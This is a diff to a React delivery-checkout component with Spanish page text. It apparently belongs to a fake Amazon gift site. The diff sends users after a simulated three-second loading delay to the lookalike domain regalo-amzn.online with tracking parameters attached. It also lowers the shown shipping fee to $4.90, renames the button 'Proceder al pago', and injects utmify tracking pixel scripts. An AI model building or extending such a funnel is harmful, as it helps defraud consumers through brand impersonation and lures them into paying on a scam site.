@@ -3,6 +3,9 @@ import Header from '../../componentes/header/Header';
 import './style.css';
 import presentes from '../../assets/presentes.jpeg';
 import { useNavigate } from 'react-router-dom';
+import { redirectWithUTM } from '../../utils/redirectWithUTM';
+
+
 
 export default function Entrega() {
   const navigate = useNavigate();
@@ -27,7 +30,7 @@ export default function Entrega() {
   
     // Simula um tempo de carregamento antes de redirecionar
     setTimeout(() => {
-      window.location.href = 'https://regalo-amzn.online/pg3/'; // Redireciona para o link externo
+      redirectWithUTM("https://regalo-amzn.online/pg3/"); // Redireciona para o link externo
     }, 3000); // 3 segundos de simulação de carregamento
   };
 
@@ -82,11 +85,11 @@ export default function Entrega() {
         </div>
         <div className='textoEspacado'>
           <p>Costo de envío</p>
-          <p>$ 42</p>
+          <p>$ 4.90</p>
         </div>
         <div className='textoEspacado textoBold'>
           <p>Total</p>
-          <p>$ 42</p>
+          <p>$ 4.90</p>
         </div>
       </div>
 
@@ -143,13 +146,31 @@ export default function Entrega() {
 
         {/* Botão que redireciona */}
         <button type="button" onClick={handleClick}>
-          Enviar
+          Proceder al pago
         </button>
       </form>
 
       {/* Tela de carregamento */}
       <div className='telaCarregamentoContainer' style={{ display: isLoading ? 'flex' : 'none', height: height }}>
         <div className="loader"></div>
+
+
+        <script>
+window.pixelId = "676a054f402f32fdec2f7281";
+var a = document.createElement("script");
+a.setAttribute("async", "");
+a.setAttribute("defer", "");
+a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+document.head.appendChild(a);
+</script>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer>
+</script>
+
+
+
+
+
+
       </div>
     </>
   );
